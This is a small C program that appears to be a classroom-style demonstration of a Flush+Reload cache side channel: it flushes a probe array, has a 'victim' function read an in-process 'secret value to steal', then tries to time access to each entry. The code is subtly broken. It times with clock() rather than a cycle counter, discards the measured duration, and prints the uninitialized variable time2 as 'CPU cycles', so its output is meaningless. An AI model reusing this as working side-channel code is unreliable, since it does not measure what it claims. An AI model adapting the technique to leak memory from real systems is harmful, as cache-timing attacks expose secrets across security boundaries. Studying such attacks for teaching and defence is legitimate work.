#include <emmintrin.h>
#include <x86intrin.h>
#include <stdio.h>
#include <stdint.h>
#include <time.h>

uint8_t array[256*4096];	//Array to cache	
int temp;
unsigned char secret = 54;	//Secret value to steal

/*cache hit threshold assumed */

#define DELTA 1024

//flushes the array from the cache
void flushSideChannel()	
{ 
	int i;
	for (i=0; i< 256; i++) array [i*4096 + DELTA] = 1;
	for(i=0; i <256; i++) 	_mm_clflush(&array[i*4096 + DELTA]);
}

// Retrieve the secret value by accessing the corresponding array item
void victim()
{
	temp = array[secret*4096 + DELTA];
}

void reloadSideChannel()
{
	int junk = 0;
	register uint64_t time1, time2;
	volatile uint8_t *addr;
	int i;
	
	//Compute the CPU cycles taken to access each item
	for (i = 0; i<256; i++)
	{
		addr = &array[i*4096 + DELTA];
		clock_t start_time = clock();
		junk = *addr;
		clock_t end_time = clock() - start_time;
		
		printf("Access time for array[%d*4096 +%d]: %d CPU cycles \n", i, DELTA, (int)time2);
	}
}
int main(int argc, const char **argv)
{
	flushSideChannel();
	victim();
	reloadSideChannel();
	return(0);
}

